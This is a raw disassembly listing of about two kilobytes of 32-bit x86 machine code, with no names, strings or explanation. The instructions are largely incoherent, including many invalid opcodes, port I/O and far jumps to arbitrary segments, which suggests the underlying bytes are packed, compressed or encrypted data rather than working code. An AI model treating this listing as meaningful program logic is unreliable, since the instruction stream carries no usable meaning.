  419c12:	mov    ds:0x96a1de07,al
  419c17:	mov    ch,0xe2
  419c19:	ss sahf 
  419c1b:	pop    ecx
  419c1c:	arpl   di,bp
  419c1e:	shl    DWORD PTR [esi],1
  419c20:	or     eax,0x40af471f
  419c25:	jl     0x419c50
  419c27:	mov    dl,BYTE PTR gs:[ecx+0x2c]
  419c2b:	cmp    DWORD PTR [esi],ecx
  419c2d:	call   0x2bda:0xfd0d1b3a
  419c34:	into   
  419c35:	lds    esp,FWORD PTR [edi]
  419c37:	inc    edi
  419c38:	cmp    al,0xd8
  419c3a:	and    DWORD PTR [edi-0x63],edx
  419c3d:	das    
  419c3e:	scas   eax,DWORD PTR es:[edi]
  419c3f:	inc    ebx
  419c40:	fsubp  st(7),st
  419c42:	add    al,BYTE PTR [eax]
  419c44:	jmp    0x419c89
  419c46:	push   cs
  419c47:	push   ss
  419c48:	push   esp
  419c49:	mov    WORD PTR [esi-0x6dc1edef],?
  419c4f:	(bad)  
  419c50:	xchg   dx,ax
  419c52:	repz mov bl,BYTE PTR [eax-0x80]
  419c56:	fbld   TBYTE PTR ds:0xad902d17
  419c5c:	xchg   esi,eax
  419c5d:	ja     0x419be2
  419c5f:	sar    ecx,cl
  419c61:	out    dx,eax
  419c62:	enter  0x2e4f,0x80
  419c66:	sub    ebp,DWORD PTR [edx]
  419c68:	popa   
  419c69:	sbb    ch,al
  419c6b:	loopne 0x419cb0
  419c6d:	(bad)  
  419c6e:	cmp    BYTE PTR [eax-0x6098cea6],al
  419c74:	cmp    bh,al
  419c76:	retf   0x737
  419c79:	mov    edx,0xf38d7be1
  419c7e:	mov    ah,0xe1
  419c80:	pop    ds
  419c81:	jne    0x419cac
  419c83:	xor    BYTE PTR [edx],al
  419c85:	sar    BYTE PTR [eax+edi*8-0x5a08a319],0x64
  419c8d:	adc    ah,BYTE PTR [ebx]
  419c8f:	ss pop ebx
  419c91:	jbe    0x419cc3
  419c93:	dec    ecx
  419c94:	pop    ebx
  419c95:	std    
  419c96:	or     eax,0xebeb308a
  419c9b:	mov    ds:0x66740dec,al
  419ca0:	mov    esp,0x8599d16
  419ca5:	xor    eax,0x2470532c
  419caa:	pop    ss
  419cab:	or     al,0xc2
  419cad:	loop   0x419c91
  419caf:	mov    edx,0x9befb2c4
  419cb4:	(bad)  
  419cb5:	leave  
  419cb6:	and    DWORD PTR [edi+0x2b9e0e10],esi
  419cbc:	push   esp
  419cbd:	sub    edi,DWORD PTR [edx+eiz*2+0x7b]
  419cc1:	mov    dh,ah
  419cc3:	mov    bl,0xdc
  419cc5:	dec    ecx
  419cc6:	ret    0x711
  419cc9:	icebp  
  419cca:	nop
  419ccb:	and    dl,bh
  419ccd:	mov    DWORD PTR [edx+0xb15a614],edi
  419cd3:	and    ch,BYTE PTR ds:0xd00e70c8
  419cd9:	cdq    
  419cda:	repz adc al,BYTE PTR [edx-0x66]
  419cde:	pusha  
  419cdf:	loop   0x419cad
  419ce1:	or     al,0x30
  419ce3:	dec    esp
  419ce4:	mov    cl,0xc7
  419ce6:	rol    BYTE PTR [ecx+0x6b44757f],0xa2
  419ced:	push   cs
  419cee:	mov    es,ecx
  419cf0:	jle    0x419ca9
  419cf2:	jae    0x419c94
  419cf4:	mov    eax,ds:0x3330dd76
  419cf9:	out    dx,eax
  419cfa:	jnp    0x419d77
  419cfc:	sti    
  419cfd:	mov    ebx,0xf0519af6
  419d02:	ds repnz mov ecx,esi
  419d06:	push   ss
  419d07:	add    eax,0x7ad9df27
  419d0c:	jne    0x419d61
  419d0e:	fld    TBYTE PTR [ebx-0x6c]
  419d11:	jle    0x419cbf
  419d13:	xchg   esi,eax
  419d14:	or     al,0x9d
  419d16:	in     eax,0x2d
  419d18:	addr16 out dx,al
  419d1a:	xor    DWORD PTR [edi],esi
  419d1c:	retf   0xa5b0
  419d1f:	jle    0x419d9f
  419d21:	les    edi,FWORD PTR [edi+0x117d06d6]
  419d27:	inc    ebp
  419d28:	(bad)  
  419d29:	jmp    0xe56e:0x910d9945
  419d30:	pop    esp
  419d31:	push   edi
  419d32:	test   BYTE PTR [ebp-0x54],al
  419d35:	ja     0x419cc5
  419d37:	mov    esi,0xc561cd65
  419d3c:	mov    bl,0x25
  419d3e:	rcl    BYTE PTR [ecx],cl
  419d40:	iret   
  419d41:	lods   eax,DWORD PTR ds:[esi]
  419d42:	clc    
  419d43:	ins    DWORD PTR es:[edi],dx
  419d44:	stos   DWORD PTR es:[edi],eax
  419d45:	setg   BYTE PTR [edi-0x36ce1f31]
  419d4c:	pop    esp
  419d4d:	scas   al,BYTE PTR es:[edi]
  419d4e:	jmp    0x7084:0x22723a66
  419d55:	xor    dh,BYTE PTR [eax+0x2abb5f98]
  419d5b:	sub    esp,DWORD PTR [edx+eiz*4+0x50deca3c]
  419d62:	xchg   edi,eax
  419d63:	xchg   ebx,eax
  419d64:	test   BYTE PTR [ebx],0x13
  419d67:	lds    edi,FWORD PTR [ebx-0x367fbf1]
  419d6d:	sbb    ch,cl
  419d6f:	sbb    dl,bh
  419d71:	mov    bl,0xb5
  419d73:	(bad)  
  419d74:	fsubp  st(5),st
  419d76:	adc    esp,DWORD PTR [edx-0x70]
  419d79:	jbe    0x419dba
  419d7b:	sub    eax,0xa2abb94e
  419d80:	jle    0x419d40
  419d82:	cmc    
  419d83:	mov    edx,0xd2673405
  419d88:	outs   dx,DWORD PTR ds:[esi]
  419d89:	and    al,0x4b
  419d8b:	popa   
  419d8c:	push   ss
  419d8d:	aas    
  419d8e:	xchg   DWORD PTR [eax],esp
  419d90:	mov    ch,0x17
  419d92:	inc    esi
  419d93:	mov    eax,0x99210c8f
  419d98:	pusha  
  419d99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d9a:	mov    edx,edi
  419d9c:	gs mov esi,0xba24e0f3
  419da2:	push   esp
  419da3:	inc    esi
  419da4:	xor    eax,DWORD PTR [esi+0x2f32335c]
  419daa:	dec    ebx
  419dab:	(bad)  
  419dad:	sub    DWORD PTR [eax],eax
  419daf:	cmp    cl,BYTE PTR [ecx+0x487ceef9]
  419db5:	mov    esi,ds
  419db7:	jmp    0x419d51
  419db9:	xor    ebp,ebp
  419dbb:	and    edi,ebp
  419dbd:	test   dl,dh
  419dbf:	cld    
  419dc0:	pop    edi
  419dc1:	retf   
  419dc2:	imul   DWORD PTR [eax-0x41aa78b0]
  419dc8:	fsubr  DWORD PTR [ebx-0x2ae4169a]
  419dce:	push   edi
  419dcf:	mov    ds,WORD PTR [esi+0x48707962]
  419dd5:	inc    ecx
  419dd6:	enter  0x27f,0x40
  419dda:	sub    ch,ah
  419ddc:	xchg   esi,eax
  419ddd:	pop    edi
  419dde:	pop    ss
  419ddf:	enter  0x254f,0xe9
  419de3:	cmp    al,0x3e
  419de5:	sbb    al,0x7a
  419de7:	mov    ds:0x1c5bf0a6,al
  419dec:	mov    dh,0x57
  419dee:	add    BYTE PTR [ebp+0x3817bf5e],dl
  419df4:	inc    ebx
  419df5:	shr    BYTE PTR [edx-0x7412b470],cl
  419dfb:	(bad)  
  419dfc:	test   BYTE PTR [edx],ch
  419dfe:	mov    ch,0x1f
  419e00:	pop    es
  419e01:	fnsave [esi+0x3402a070]
  419e07:	xor    al,0xff
  419e09:	cmp    eax,0xfe973b92
  419e0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e0f:	push   0xe71dc7ee
  419e14:	mov    eax,0x82f3be69
  419e19:	(bad)  
  419e1a:	outs   dx,BYTE PTR ds:[esi]
  419e1b:	mov    bh,0x42
  419e1d:	xchg   esi,eax
  419e1e:	(bad)  
  419e1f:	je     0x419e22
  419e21:	lods   al,BYTE PTR ds:[esi]
  419e22:	cmc    
  419e23:	mov    esi,0x1ad9c362
  419e28:	daa    
  419e29:	jbe    0x419e0d
  419e2b:	jl     0x419e64
  419e2d:	mov    ah,0x96
  419e2f:	jns    0x419e9d
  419e31:	ja     0x419e8a
  419e33:	fidivr WORD PTR [edx]
  419e35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e36:	ret    
  419e37:	(bad)  
  419e38:	ds in  eax,dx
  419e3a:	repnz sbb cl,dl
  419e3d:	cmc    
  419e3e:	xor    al,0x25
  419e40:	jne    0x419dd3
  419e42:	dec    esp
  419e43:	pop    edx
  419e44:	arpl   WORD PTR [edx+0x8],di
  419e47:	pop    ebx
  419e48:	jmp    0x6270eaf2
  419e4d:	add    al,0x5d
  419e4f:	cli    
  419e50:	add    esp,esp
  419e52:	rcr    ah,cl
  419e54:	and    esi,DWORD PTR [ebx]
  419e56:	sbb    al,0xae
  419e58:	lea    eax,ds:0x2b4a58cd
  419e5e:	ds mov esi,0xf4ad7835
  419e64:	mov    esp,0xd17efafa
  419e69:	fnstcw WORD PTR gs:[ebx+0x37558a31]
  419e70:	mov    ds,WORD PTR [esi-0x400b2ea0]
  419e76:	or     al,0x16
  419e78:	test   al,0x17
  419e7a:	in     al,dx
  419e7b:	jns    0x419e5f
  419e7d:	out    0xec,al
  419e7f:	jge    0x419ee1
  419e81:	int3   
  419e82:	mov    ah,0xb
  419e84:	(bad)  
  419e85:	gs cs ret 
  419e88:	scas   al,BYTE PTR es:[edi]
  419e89:	push   ebp
  419e8a:	fwait
  419e8b:	sub    ecx,DWORD PTR [edx-0x4]
  419e8e:	xor    BYTE PTR [ebx-0x378b726d],0xe4
  419e95:	std    
  419e96:	mov    eax,0xa463eaaf
  419e9b:	add    eax,0x66723dc6
  419ea0:	and    BYTE PTR [ebx+0xa],0xb3
  419ea4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ea5:	retf   0x31a4
  419ea8:	jl     0x419e7b
  419eaa:	xchg   esi,ebx
  419eac:	push   ecx
  419ead:	nop
  419eae:	dec    ebp
  419eaf:	aaa    
  419eb0:	or     BYTE PTR [ebx+0x24],bl
  419eb3:	cdq    
  419eb4:	jmp    0x610a:0x7f166f7f
  419ebb:	mov    ds:0xc464d1f2,eax
  419ec0:	test   DWORD PTR [edi+0x3252fc17],eax
  419ec6:	sbb    esp,ebp
  419ec8:	ffree  st(6)
  419eca:	push   0x6f
  419ecc:	mov    ds:0x31b3a69e,al
  419ed1:	xchg   ebx,eax
  419ed2:	and    DWORD PTR [edx-0x50],ebx
  419ed5:	sub    DWORD PTR [ebp+0x22],esi
  419ed8:	mov    edi,0xbecdbc5c
  419edd:	scas   eax,DWORD PTR es:[edi]
  419ede:	lock out 0xb9,eax
  419ee1:	jl     0x419e81
  419ee3:	pop    ecx
  419ee4:	adc    eax,0xc69a9627
  419ee9:	in     al,dx
  419eea:	aam    0x29
  419eec:	in     eax,dx
  419eed:	sahf   
  419eee:	jmp    0x419e8b
  419ef0:	out    0x20,al
  419ef2:	mov    eax,0x8b2faae1
  419ef7:	sbb    eax,0x2d123d08
  419efc:	inc    ecx
  419efd:	sub    BYTE PTR [esi-0x48],al
  419f00:	fs fs test bh,dl
  419f04:	imul   esp,DWORD PTR [eiz*2+0x33dbc8e],0x2338ae23
  419f0f:	xchg   esp,ebx
  419f11:	cmp    al,0x9
  419f13:	stc    
  419f14:	jge    0x419f2f
  419f16:	pop    eax
  419f17:	jnp    0x419f66
  419f19:	dec    edi
  419f1a:	sub    DWORD PTR [edi-0x10],edx
  419f1d:	jmp    0x163b:0xf2598d21
  419f24:	inc    esp
  419f25:	pop    esi
  419f26:	mov    dh,0x11
  419f28:	nop
  419f29:	gs jle 0x419f57
  419f2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f2d:	jge    0x419f4b
  419f2f:	popa   
  419f30:	shr    DWORD PTR [esi],cl
  419f32:	sub    al,0xd3
  419f34:	mov    dh,0x72
  419f36:	jg     0x419fb4
  419f38:	push   0x4d
  419f3a:	cmp    dl,ah
  419f3c:	push   DWORD PTR ds:0xa8e480e4
  419f42:	retf   
  419f43:	(bad)  
  419f44:	adc    edx,edi
  419f46:	gs jle 0x419f01
  419f49:	es inc edi
  419f4b:	and    eax,0x29f9388e
  419f50:	pushf  
  419f51:	retf   0x3f38
  419f54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f55:	cmp    ah,BYTE PTR [ebp+0x760a8835]
  419f5b:	xor    BYTE PTR [esi-0xdc1155f],ch
  419f61:	icebp  
  419f62:	and    al,0xf4
  419f64:	mov    eax,0x47004ffe
  419f69:	dec    edx
  419f6a:	stos   DWORD PTR es:[edi],eax
  419f6b:	add    al,0xce
  419f6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f6f:	loope  0x419f1a
  419f71:	cmp    al,0x52
  419f73:	(bad)  
  419f74:	jne    0x419f4e
  419f76:	sbb    ebp,DWORD PTR gs:[edi-0x67]
  419f7a:	mov    ebx,0x584a3b1
  419f7f:	or     DWORD PTR [ebp+esi*2+0x7db6e8eb],ebx
  419f86:	mov    ch,0x6
  419f88:	jmp    0x6261053b
  419f8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f8e:	add    DWORD PTR [edi],0xffffff8e
  419f91:	retf   0x409a
  419f94:	jmp    0x9d184f3c
  419f99:	mov    BYTE PTR [edx-0x2],dh
  419f9c:	xchg   DWORD PTR ds:0x581f338a,edi
  419fa2:	fstp   TBYTE PTR [edx-0x31]
  419fa5:	jmp    DWORD PTR [ebp+0x15]
  419fa8:	mov    dl,0x3e
  419faa:	test   edx,eax
  419fac:	jmp    0x57e4:0x9c1f4c2e
  419fb3:	fst    QWORD PTR [eax]
  419fb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419fb6:	rcr    BYTE PTR [ebp+0x1f],0x71
  419fba:	scas   eax,DWORD PTR es:[edi]
  419fbb:	aaa    
  419fbc:	adc    DWORD PTR ds:0xcf70c705,edx
  419fc2:	dec    edi
  419fc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419fc4:	mov    cl,0x66
  419fc6:	push   ds
  419fc7:	lahf   
  419fc8:	rcl    DWORD PTR [ecx+0x47b172d2],0xed
  419fcf:	add    ecx,DWORD PTR [ebx+0x274f6697]
  419fd5:	iret   
  419fd6:	mov    ecx,0x4e9c6ecb
  419fdb:	push   0x822555d9
  419fe0:	enter  0x7c25,0x2b
  419fe4:	retf   0xa52a
  419fe7:	neg    DWORD PTR [edx-0x76]
  419fea:	lahf   
  419feb:	push   cs
  419fec:	cld    
  419fed:	pop    ebp
  419fee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419fef:	jmp    0x946b46c0
  419ff4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ff5:	inc    esi
  419ff6:	cmp    edx,DWORD PTR ds:0xe6905b87
  419ffc:	pop    es
  419ffd:	pop    es
  419ffe:	inc    edx
  419fff:	sahf   
  41a000:	fwait
  41a001:	xor    eax,0x1f6f1d06
  41a006:	lods   eax,DWORD PTR ds:[esi]
  41a007:	add    eax,esp
  41a009:	jecxz  0x419fe9
  41a00b:	mov    eax,ds:0x9e19471a
  41a010:	xchg   ecx,eax
  41a011:	xchg   esi,eax
  41a012:	(bad)  
  41a013:	adc    esi,DWORD PTR [edx-0x491dcd0]
  41a019:	jns    0x41a06a
  41a01b:	inc    ebp
  41a01c:	pop    ecx
  41a01d:	test   esi,edi
  41a01f:	das    
  41a020:	xor    edi,DWORD PTR [ebp+0x1302ddc6]
  41a026:	pop    esi
  41a027:	popa   
  41a028:	test   eax,0x3a219d50
  41a02d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a02e:	push   0xffffffcd
  41a030:	sub    bh,BYTE PTR [edi-0x168f9044]
  41a036:	xor    DWORD PTR [edx+ebx*8-0x5e15d2ef],edx
  41a03d:	mov    eax,ds:0x8fb2c817
  41a042:	enter  0x35a0,0xbf
  41a046:	jmp    0x41a06a
  41a048:	loop   0x419fe8
  41a04a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a04b:	out    dx,al
  41a04c:	xor    DWORD PTR [esi+0x7a],edx
  41a04f:	cs out 0x5a,eax
  41a052:	push   cs
  41a053:	dec    edi
  41a054:	sar    dh,0x2c
  41a057:	test   ch,0xe6
  41a05a:	push   es
  41a05b:	and    ecx,ebp
  41a05d:	xchg   esp,eax
  41a05e:	mov    eax,0xe259bb30
  41a063:	push   es
  41a064:	lods   eax,DWORD PTR cs:[esi]
  41a066:	clc    
  41a067:	mov    al,0x50
  41a069:	pop    ss
  41a06a:	xchg   esi,eax
  41a06b:	addr16 (bad) 
  41a06d:	fadd   DWORD PTR [ebp+0x2b5519c9]
  41a073:	test   al,0x76
  41a075:	aad    0x96
  41a077:	ins    DWORD PTR es:[edi],dx
  41a078:	rcr    DWORD PTR [ebx+0x650cef59],cl
  41a07e:	and    al,0xac
  41a080:	imul   ah
  41a082:	sahf   
  41a083:	xchg   ebp,eax
  41a084:	into   
  41a085:	daa    
  41a086:	stos   DWORD PTR es:[edi],eax
  41a087:	int3   
  41a088:	test   al,0x5d
  41a08a:	inc    ecx
  41a08b:	add    esi,DWORD PTR [edi]
  41a08d:	pop    edi
  41a08e:	in     al,0xfc
  41a090:	iret   
  41a091:	test   BYTE PTR gs:[ebp+0x6bdba6b],0x1f
  41a099:	adc    al,0xb
  41a09b:	push   edi
  41a09c:	or     DWORD PTR [esi+0x74811380],esi
  41a0a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a0a3:	inc    ebx
  41a0a4:	inc    ebp
  41a0a5:	cmc    
  41a0a6:	add    cl,ah
  41a0a8:	xchg   BYTE PTR ds:0x2b6b8673,dh
  41a0ae:	or     al,0x40
  41a0b0:	add    dl,BYTE PTR ds:0x81ec2f5f
  41a0b6:	mov    ecx,0x91d2be95
  41a0bb:	js     0x41a0ba
  41a0bd:	jg     0x41a12b
  41a0bf:	(bad)  
  41a0c0:	clc    
  41a0c1:	cli    
  41a0c2:	push   es
  41a0c3:	mov    cl,0xcf
  41a0c5:	scas   al,BYTE PTR es:[edi]
  41a0c6:	ret    
  41a0c7:	xchg   BYTE PTR [edx+0x72],ah
  41a0ca:	into   
  41a0cb:	pushf  
  41a0cc:	call   0xcb2f7d0c
  41a0d1:	sbb    ch,dh
  41a0d3:	mov    ebp,0xf50d47cd
  41a0d8:	sub    bh,BYTE PTR [eax+edx*8+0x529e61fa]
  41a0df:	(bad)
  41a0e2:	mov    cl,0x36
  41a0e4:	iret   
  41a0e5:	inc    esp
  41a0e6:	nop
  41a0e7:	fnstenv [ecx-0x1c]
  41a0ea:	cmp    esp,DWORD PTR [edi+0x41d4fd89]
  41a0f0:	jne    0x41a114
  41a0f2:	mov    ebp,0x1ce3ba31
  41a0f7:	adc    dh,BYTE PTR ds:0xc1af456
  41a0fd:	inc    edi
  41a0fe:	inc    ecx
  41a0ff:	jbe    0x41a0d0
  41a101:	or     edi,ebp
  41a103:	xor    eax,0x812ae0ae
  41a108:	xchg   ebp,eax
  41a109:	mov    esi,0x5a57b6a0
  41a10e:	nop
  41a10f:	inc    esi
  41a110:	retf   
  41a111:	xor    eax,0xf9250af0
  41a116:	test   eax,0x626b59aa
  41a11b:	pop    edi
  41a11c:	cdq    
  41a11d:	std    
  41a11e:	jmp    0xe17b2a70
  41a123:	es aad 0xe8
  41a126:	mov    edi,0x2161db3a
  41a12b:	sbb    bl,BYTE PTR [ebx*8-0x6d7ad559]
  41a132:	inc    esp
  41a133:	fimul  DWORD PTR ss:[ebx]
  41a136:	or     al,0xbb
  41a138:	inc    esp
  41a139:	in     eax,0x16
  41a13b:	pop    esi
  41a13c:	add    BYTE PTR [edi],ah
  41a13e:	add    DWORD PTR [esi+0x5125e0f5],edx
  41a144:	icebp  
  41a145:	add    edx,DWORD PTR [ebx+0x59]
  41a148:	in     eax,dx
  41a149:	out    dx,eax
  41a14a:	cmp    eax,0xcb625385
  41a14f:	in     eax,dx
  41a150:	inc    ecx
  41a151:	fistp  DWORD PTR [ebx-0x4e]
  41a154:	fld    TBYTE PTR [edi-0x1b]
  41a157:	mov    edi,0x2d92d2cc
  41a15c:	retf   
  41a15d:	or     eax,DWORD PTR gs:[ebx]
  41a160:	xchg   edi,eax
  41a161:	out    dx,al
  41a162:	shl    BYTE PTR [edx],cl
  41a164:	or     dh,BYTE PTR [eax+ecx*8]
  41a167:	fndisi(8087 only) 
  41a169:	iret   
  41a16a:	push   ebp
  41a16b:	push   cs
  41a16c:	inc    edi
  41a16d:	or     eax,0xa1c5a57a
  41a172:	rcpps  xmm6,xmm3
  41a175:	rcl    dh,0x16
  41a178:	not    BYTE PTR [eax+0x25f857b9]
  41a17e:	cmp    BYTE PTR [eax+0x11],cl
  41a181:	fidivr WORD PTR [edi+0x39]
  41a184:	nop
  41a185:	mov    eax,ds:0x12334889
  41a18a:	mov    bl,0xe5
  41a18c:	lds    ecx,FWORD PTR [edx+0x10]
  41a18f:	inc    ebx
  41a190:	push   edx
  41a191:	push   cs
  41a192:	cmp    bh,BYTE PTR [eax]
  41a194:	lock push edx
  41a196:	repz or al,0x3b
  41a199:	in     eax,0xad
  41a19b:	jg     0x41a179
  41a19d:	mov    ebp,0xbcb6819b
  41a1a2:	divps  xmm1,xmm7
  41a1a5:	jmp    0x41a177
  41a1a7:	lea    esp,[esp+edx*4-0x46]
  41a1ab:	in     al,dx
  41a1ac:	rcl    dh,cl
  41a1ae:	adc    edx,ecx
  41a1b0:	sbb    al,0xc6
  41a1b2:	xchg   edx,eax
  41a1b3:	leave  
  41a1b4:	inc    ebx
  41a1b5:	in     eax,0x36
  41a1b7:	cld    
  41a1b8:	enter  0x20a0,0xfd
  41a1bc:	inc    ebp
  41a1bd:	add    eax,0xcc519c96
  41a1c2:	psubb  mm6,mm0
  41a1c5:	jp     0x41a1b9
  41a1c7:	mov    eax,ds:0x85fd4c31
  41a1cc:	mov    eax,ds:0xe5405ae5
  41a1d1:	repz xor ebp,DWORD PTR [esi]
  41a1d4:	mov    ebp,0x895845b4
  41a1d9:	mov    eax,0xc55243b1
  41a1de:	sbb    al,0xab
  41a1e0:	sub    DWORD PTR [ecx*4+0x639ce619],ebx
  41a1e7:	int    0xdd
  41a1e9:	push   ss
  41a1ea:	(bad)  
  41a1ec:	mov    ch,0x36
  41a1ee:	add    eax,0x2d609de2
  41a1f3:	or     al,0x7c
  41a1f5:	mov    BYTE PTR [edx+0x6405d167],ch
  41a1fb:	dec    edi
  41a1fc:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a1fe:	jb     0x41a1ff
  41a200:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a201:	jae    0x41a19a
  41a203:	mov    eax,0x95114975
  41a208:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a209:	fdiv   DWORD PTR [ecx-0x1d257d38]
  41a20f:	mov    ?,edx
  41a211:	xor    al,0x52
  41a213:	pop    esi
  41a214:	pusha  
  41a215:	bound  ebp,QWORD PTR cs:[ebp+0xf]
  41a219:	jmp    0x41a280
  41a21b:	stc    
  41a21c:	in     al,dx
  41a21d:	pop    esi
  41a21e:	iret   
  41a21f:	push   edx
  41a220:	gs popf 
  41a222:	fidiv  WORD PTR [esi+0x54]
  41a225:	inc    esi
  41a226:	mov    WORD PTR [ebp-0x63c2216e],cs
  41a22c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a22d:	popf   
  41a22e:	inc    edx
  41a22f:	xor    eax,0xb5ad441d
  41a234:	pop    es
  41a235:	jge    0x41a22b
  41a237:	and    al,0x79
  41a239:	and    bh,BYTE PTR [ebx-0x5cf8f53f]
  41a23f:	mov    cl,0x44
  41a241:	popf   
  41a242:	jb     0x41a216
  41a244:	xor    eax,0xf0d23175
  41a249:	cmp    edx,0xe069dc74
  41a24f:	out    dx,al
  41a250:	popf   
  41a251:	push   ebx
  41a252:	sub    ah,BYTE PTR [eax+esi*8]
  41a255:	mov    dl,0xa5
  41a257:	repz cmp bl,BYTE PTR [ecx]
  41a25a:	cmp    DWORD PTR [ebx-0x27],0x2f8b032
  41a261:	ins    DWORD PTR es:[edi],dx
  41a262:	cmp    bh,ch
  41a264:	test   eax,0xa0d2e7dc
  41a269:	out    0x2b,al
  41a26b:	or     DWORD PTR [ebp-0x5178b59f],0x23
  41a272:	push   eax
  41a273:	cmp    DWORD PTR [eax],0x3d6c60ff
  41a279:	(bad)  
  41a27b:	test   ebp,0xc00a07f3
  41a281:	ror    BYTE PTR [ebx+0x5bb9b1e8],0x6c
  41a288:	jle    0x41a2c1
  41a28a:	and    ch,BYTE PTR [edi]
  41a28c:	call   0xf909:0xdbe97c69
  41a293:	mov    ebp,DWORD PTR [edi+0x21c92165]
  41a299:	cwde   
  41a29a:	lods   al,BYTE PTR ds:[esi]
  41a29b:	sbb    al,0xf7
  41a29d:	jb     0x41a2d0
  41a29f:	sub    al,ch
  41a2a1:	adc    DWORD PTR [ecx-0x44],eax
  41a2a4:	into   
  41a2a5:	jne    0x41a2c8
  41a2a7:	jne    0x41a26b
  41a2a9:	lds    ecx,FWORD PTR [ebx-0x41980806]
  41a2af:	or     DWORD PTR ds:0xeccb915c,esp
  41a2b5:	mov    eax,ds:0x411adc31
  41a2ba:	inc    edx
  41a2bb:	adc    al,0xfc
  41a2bd:	out    dx,eax
  41a2be:	push   0x5c
  41a2c0:	ror    DWORD PTR ds:0xa79fc948,0x2d
  41a2c7:	mov    ebp,0x284c5c37
  41a2cc:	mov    bh,0x6c
  41a2ce:	les    ebp,FWORD PTR [eax+edi*2+0x1d]
  41a2d2:	es push esi
  41a2d4:	retf   0xc129
  41a2d7:	jecxz  0x41a266
  41a2d9:	inc    eax
  41a2da:	sbb    dl,ch
  41a2dc:	mov    al,ds:0x298c3f02
  41a2e1:	cld    
  41a2e2:	xchg   edi,eax
  41a2e3:	dec    ecx
  41a2e4:	jno    0x41a312
  41a2e6:	fsubr  st,st(3)
  41a2e8:	mov    ecx,0xadc2967c
  41a2ed:	call   FWORD PTR [eax-0x559852ef]
  41a2f3:	add    eax,0xf9085e63
  41a2f8:	leave  
  41a2f9:	sbb    dh,BYTE PTR [esi+ebx*2]
  41a2fc:	pop    esp
  41a2fd:	cld    
  41a2fe:	sbb    BYTE PTR [ecx*4-0x13f1ccbd],al
  41a305:	sub    eax,0x7d5c8050
  41a30a:	inc    ebp
  41a30b:	popa   
  41a30c:	mov    edx,0xe4b5080d
  41a311:	or     DWORD PTR ds:0x78288cc3,edi
  41a317:	or     ch,BYTE PTR [ecx]
  41a319:	call   0xd04a:0x6f5da36b
  41a320:	cli    
  41a321:	icebp  
  41a322:	fs sub eax,0x1447e01
  41a328:	or     al,0x80
  41a32a:	loopne 0x41a340
  41a32c:	lahf   
  41a32d:	and    al,BYTE PTR [ebx-0xa64c2ed]
  41a333:	dec    ebx
  41a334:	sbb    dh,BYTE PTR [ecx-0xf]
  41a337:	cmp    BYTE PTR [esi-0x79811efb],ch
  41a33d:	xor    dl,dh
  41a33f:	aas    
  41a340:	ds or  al,0x4a
  41a343:	ret    0xd5a9
  41a346:	clc    
  41a347:	push   edi
  41a348:	push   ecx
  41a349:	aaa    
  41a34a:	std    
  41a34b:	or     ch,0x5a
  41a34e:	mov    eax,ds:0x27976021
  41a353:	repz or eax,0xb9f3f70c
  41a359:	sbb    al,0xb5
  41a35b:	std    
  41a35c:	int    0x7c
  41a35e:	jmp    0x41a3cf
  41a360:	or     al,0x75
  41a362:	jmp    0x41a2f4
  41a364:	fidivr WORD PTR [ebx-0x7e]
  41a367:	sti    
  41a368:	mov    ebx,ebp
  41a36a:	cmp    BYTE PTR [edx],bl
  41a36c:	ss push 0x9b56f323
  41a372:	cld    
  41a373:	out    dx,eax
  41a374:	adc    eax,0x24dc4d00
  41a379:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a37a:	jecxz  0x41a335
  41a37c:	mov    ah,0x35
  41a37e:	jnp    0x41a37f
  41a380:	dec    edx
  41a381:	mov    cl,0x52
  41a383:	in     eax,0x98
  41a385:	push   ebx
  41a386:	(bad)  
  41a387:	jns    0x41a37f
  41a389:	jno    0x41a361
  41a38b:	scas   al,BYTE PTR es:[edi]
  41a38c:	mov    ?,WORD PTR [edx+ecx*8]
  41a38f:	das    
  41a390:	mov    ebp,0x2c579025
  41a395:	outs   dx,DWORD PTR ds:[esi]
  41a396:	push   eax
  41a397:	mov    edi,0xd8d30012
  41a39c:	nop
  41a39d:	xor    DWORD PTR [edi-0x5ff3afee],0x3effb252
  41a3a7:	cs pop ss
  41a3a9:	dec    ebp
  41a3aa:	inc    ebx
  41a3ab:	or     DWORD PTR [edx+eiz*8-0x682a5d2d],ebx
  41a3b2:	sbb    BYTE PTR [eax+0x3],al
  41a3b5:	pop    sp
  41a3b7:	lds    edx,FWORD PTR [edi-0x2e1739c2]
  41a3bd:	loope  0x41a41b
  41a3bf:	xor    DWORD PTR [edx-0x33],ebx
  41a3c2:	jmp    0x51be10e0
  41a3c7:	out    dx,eax
  41a3c8:	aas    
  41a3c9:	retf   0xbd16
  41a3cc:	test   dh,dh
  41a3ce:	repz imul BYTE PTR ss:[eax-0x6a]
  41a3d3:	inc    esi
  41a3d4:	out    dx,eax
  41a3d5:	pop    esp
  41a3d6:	sbb    ah,BYTE PTR [ebp-0x31]
  41a3d9:	mov    al,0xa1
  41a3db:	cld    
  41a3dc:	lahf   
  41a3dd:	in     al,dx
  41a3de:	fbld   TBYTE PTR [bp+si-0x5]
  41a3e2:	or     BYTE PTR [ebx],bh
  41a3e4:	push   ds
  41a3e5:	sub    dh,al
  41a3e7:	jno    0x41a455
  41a3e9:	inc    ax
  41a3eb:	mov    esp,0x97fe6644
